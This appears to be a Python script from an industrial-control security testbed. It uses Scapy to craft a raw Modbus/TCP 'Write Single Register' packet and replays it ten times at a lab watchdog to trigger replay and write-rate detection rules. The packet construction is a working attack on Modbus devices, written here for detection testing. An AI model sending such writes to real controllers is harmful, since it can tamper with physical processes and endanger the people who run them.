"""
Replay Attack Scenario
Crafts a raw Modbus/TCP FC06 (Write Single Register) packet using Scapy
and retransmits the exact same payload multiple times in rapid succession
to the watchdog for passive detection.
Triggers rules:
R-007: Replay Attack (Identical payload sent > 3 times in 5s)
R-008: Excessive Write Rate (> 20 writes in 10s)
"""

import time
import logging
import struct
from scapy.all import IP, TCP, send

logger = logging.getLogger("injector")

WATCHDOG_IP = "192.168.100.100"

def run():
    logger.info("Starting Replay Attack (T0856)")
    # Craft a synthetic Modbus FC06 (Write Single Register) packet
    # MBAP: TransID=1, Proto=0, Len=6, UnitID=1, FC=6
    # PDU:  Addr=5, Val=999
    mbap = struct.pack('>HHHBB', 1, 0, 6, 1, 6)
    pdu = struct.pack('>HH', 5, 999)
    payload = mbap + pdu

    logger.info("  -> Replaying identical FC06 packet 10 times in 3 seconds...")

    for _ in range(10):
        pkt = IP(dst=WATCHDOG_IP) / TCP(dport=502, sport=44444, flags='PA') / payload
        send(pkt, verbose=0)
        time.sleep(0.3)

    logger.info("Replay Attack complete.")
